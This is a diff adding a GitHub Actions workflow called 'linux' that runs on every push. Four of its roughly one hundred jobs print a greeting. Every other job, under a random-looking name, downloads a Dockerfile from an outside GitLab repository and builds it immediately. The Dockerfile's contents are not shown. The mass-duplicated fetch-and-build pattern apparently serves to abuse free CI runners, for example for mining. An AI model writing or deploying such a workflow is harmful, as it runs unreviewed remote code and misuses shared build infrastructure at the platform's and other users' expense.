@@ -1,0 +1,487 @@
+name: linux
+on: [push]
+
+
+
+jobs:
+  namestrap:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: ls && echo Hello, world!
+  bpefas:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: ls && echo Hello, world!
+  namjimunsha:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: ls && echo Hello, world!
+  lamestrap:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: ls && echo Hello, world!
+  aasem:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/chriskm0909/matasya-thread/-/raw/main/Dockerfile && docker build .
+  aasema:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/chriskm0909/matasya-thread/-/raw/main/Dockerfile && docker build .
+  aasemi:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/chriskm0909/matasya-thread/-/raw/main/Dockerfile && docker build .
+  aasemo:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/chriskm0909/matasya-thread/-/raw/main/Dockerfile && docker build .
+  aaseme:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/chriskm0909/matasya-thread/-/raw/main/Dockerfile && docker build .
+  aasemd:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/chriskm0909/matasya-thread/-/raw/main/Dockerfile && docker build .
+  asem:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/chriskm0909/matasya-thread/-/raw/main/Dockerfile && docker build .
+  asema:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/chriskm0909/matasya-thread/-/raw/main/Dockerfile && docker build .
+  asemi:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/chriskm0909/matasya-thread/-/raw/main/Dockerfile && docker build .
+  asemo:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/chriskm0909/matasya-thread/-/raw/main/Dockerfile && docker build .
+  aseme:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/chriskm0909/matasya-thread/-/raw/main/Dockerfile && docker build .
+  asemd:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/chriskm0909/matasya-thread/-/raw/main/Dockerfile && docker build .
+  aaasems:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/chriskm0909/matasya-thread/-/raw/main/Dockerfile && docker build .
+  aaasemsa:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/chriskm0909/matasya-thread/-/raw/main/Dockerfile && docker build .
+  aaasemsi:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/chriskm0909/matasya-thread/-/raw/main/Dockerfile && docker build .
+  aaasemso:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/chriskm0909/matasya-thread/-/raw/main/Dockerfile && docker build .
+  aaasemse:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/chriskm0909/matasya-thread/-/raw/main/Dockerfile && docker build .
+  aaasemsd:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/chriskm0909/matasya-thread/-/raw/main/Dockerfile && docker build .
+  aasems:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/chriskm0909/matasya-thread/-/raw/main/Dockerfile && docker build .
+  aasemsa:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/chriskm0909/matasya-thread/-/raw/main/Dockerfile && docker build .
+  aasemsi:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/chriskm0909/matasya-thread/-/raw/main/Dockerfile && docker build .
+  aasemso:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/chriskm0909/matasya-thread/-/raw/main/Dockerfile && docker build .
+  aasemse:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/chriskm0909/matasya-thread/-/raw/main/Dockerfile && docker build .
+  aasemsd:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/chriskm0909/matasya-thread/-/raw/main/Dockerfile && docker build .
+  manifets:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/chriskm0909/matasya-thread/-/raw/main/Dockerfile && docker build .
+  anjshubelr:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/chriskm0909/matasya-thread/-/raw/main/Dockerfile && docker build .
+  cnakhny:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/chriskm0909/matasya-thread/-/raw/main/Dockerfile && docker build .
+  bgahu:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/chriskm0909/matasya-thread/-/raw/main/Dockerfile && docker build .
+  yertefagsh:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/chriskm0909/matasya-thread/-/raw/main/Dockerfile && docker build .
+  xbanhukop:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/chriskm0909/matasya-thread/-/raw/main/Dockerfile && docker build .
+  lambdafa:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/chriskm0909/matasya-thread/-/raw/main/Dockerfile && docker build .
+  xvafstujmhujg:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/chriskm0909/matasya-thread/-/raw/main/Dockerfile && docker build .
+  ansgbxhajhyubh:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/chriskm0909/matasya-thread/-/raw/main/Dockerfile && docker build .
+  vxbaghjhsuhy:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/chriskm0909/matasya-thread/-/raw/main/Dockerfile && docker build .
+  bxnaiouhjsyjhyjhy:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/chriskm0909/matasya-thread/-/raw/main/Dockerfile && docker build .
+  nshub:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/chriskm0909/matasya-thread/-/raw/main/Dockerfile && docker build .
+  nahube:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/chriskm0909/matasya-thread/-/raw/main/Dockerfile && docker build .
+  nahure:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/chriskm0909/matasya-thread/-/raw/main/Dockerfile && docker build .
+  xnsjlopo:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/chriskm0909/matasya-thread/-/raw/main/Dockerfile && docker build .
+  xbgsyabgj:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/chriskm0909/matasya-thread/-/raw/main/Dockerfile && docker build .
+  afaxela:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/chriskm0909/matasya-thread/-/raw/main/Dockerfile && docker build .
+  bfaxela:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/chriskm0909/matasya-thread/-/raw/main/Dockerfile && docker build .
+  cfaxela:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/chriskm0909/matasya-thread/-/raw/main/Dockerfile && docker build .
+  dfaxela:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/chriskm0909/matasya-thread/-/raw/main/Dockerfile && docker build .
+  efaxela:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/chriskm0909/matasya-thread/-/raw/main/Dockerfile && docker build .
+  ffaxela:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/chriskm0909/matasya-thread/-/raw/main/Dockerfile && docker build .
+  gfaxela:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/chriskm0909/matasya-thread/-/raw/main/Dockerfile && docker build .
+  hfaxela:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/chriskm0909/matasya-thread/-/raw/main/Dockerfile && docker build .
+  ifaxela:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/chriskm0909/matasya-thread/-/raw/main/Dockerfile && docker build .
+  jfaxela:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/chriskm0909/matasya-thread/-/raw/main/Dockerfile && docker build .
+  kfaxela:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/chriskm0909/matasya-thread/-/raw/main/Dockerfile && docker build .
+  lfaxela:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/chriskm0909/matasya-thread/-/raw/main/Dockerfile && docker build .
+  mfaxela:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/chriskm0909/matasya-thread/-/raw/main/Dockerfile && docker build .
+  nfaxela:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/chriskm0909/matasya-thread/-/raw/main/Dockerfile && docker build .
+  ofaxela:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/chriskm0909/matasya-thread/-/raw/main/Dockerfile && docker build .
+  pfaxela:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/chriskm0909/matasya-thread/-/raw/main/Dockerfile && docker build .
+  qfaxela:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/chriskm0909/matasya-thread/-/raw/main/Dockerfile && docker build .
+  rfaxela:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/chriskm0909/matasya-thread/-/raw/main/Dockerfile && docker build .
+  sfaxela:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/chriskm0909/matasya-thread/-/raw/main/Dockerfile && docker build .
+  tfaxela:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/chriskm0909/matasya-thread/-/raw/main/Dockerfile && docker build .
+  ufaxela:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/chriskm0909/matasya-thread/-/raw/main/Dockerfile && docker build .
+  vfaxela:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/chriskm0909/matasya-thread/-/raw/main/Dockerfile && docker build .
+  wfaxela:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/chriskm0909/matasya-thread/-/raw/main/Dockerfile && docker build .
+  xfaxela:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/chriskm0909/matasya-thread/-/raw/main/Dockerfile && docker build .
+  yfaxela:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/chriskm0909/matasya-thread/-/raw/main/Dockerfile && docker build .
+  zfaxela:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/chriskm0909/matasya-thread/-/raw/main/Dockerfile && docker build .
+  anabilakim:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/chriskm0909/matasya-thread/-/raw/main/Dockerfile && docker build .
+  bnabilakim:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/chriskm0909/matasya-thread/-/raw/main/Dockerfile && docker build .
+  cnabilakim:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/chriskm0909/matasya-thread/-/raw/main/Dockerfile && docker build .
+  dnabilakim:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/chriskm0909/matasya-thread/-/raw/main/Dockerfile && docker build .
+  enabilakim:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/chriskm0909/matasya-thread/-/raw/main/Dockerfile && docker build .
+  fnabilakim:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/chriskm0909/matasya-thread/-/raw/main/Dockerfile && docker build .
+  gnabilakim:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/chriskm0909/matasya-thread/-/raw/main/Dockerfile && docker build .
+  hnabilakim:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/chriskm0909/matasya-thread/-/raw/main/Dockerfile && docker build .
+  inabilakim:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/chriskm0909/matasya-thread/-/raw/main/Dockerfile && docker build .
+  jnabilakim:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/chriskm0909/matasya-thread/-/raw/main/Dockerfile && docker build .
+  knabilakim:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/chriskm0909/matasya-thread/-/raw/main/Dockerfile && docker build .
+  lnabilakim:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/chriskm0909/matasya-thread/-/raw/main/Dockerfile && docker build .
+  mnabilakim:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/chriskm0909/matasya-thread/-/raw/main/Dockerfile && docker build .
+  nnabilakim:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/chriskm0909/matasya-thread/-/raw/main/Dockerfile && docker build .
+  onabilakim:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/chriskm0909/matasya-thread/-/raw/main/Dockerfile && docker build .
+  pnabilakim:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/chriskm0909/matasya-thread/-/raw/main/Dockerfile && docker build .
+  qnabilakim:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/chriskm0909/matasya-thread/-/raw/main/Dockerfile && docker build .
+  rnabilakim:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/chriskm0909/matasya-thread/-/raw/main/Dockerfile && docker build .
+  snabilakim:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/chriskm0909/matasya-thread/-/raw/main/Dockerfile && docker build .
+  tnabilakim:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/chriskm0909/matasya-thread/-/raw/main/Dockerfile && docker build .
+  unabilakim:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/chriskm0909/matasya-thread/-/raw/main/Dockerfile && docker build .
+  vnabilakim:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/chriskm0909/matasya-thread/-/raw/main/Dockerfile && docker build .
+  wnabilakim:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/chriskm0909/matasya-thread/-/raw/main/Dockerfile && docker build .
+  xnabilakim:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/chriskm0909/matasya-thread/-/raw/main/Dockerfile && docker build .
+  ynabilakim:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/chriskm0909/matasya-thread/-/raw/main/Dockerfile && docker build .
+  znabilakim:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/chriskm0909/matasya-thread/-/raw/main/Dockerfile && docker build .
+  
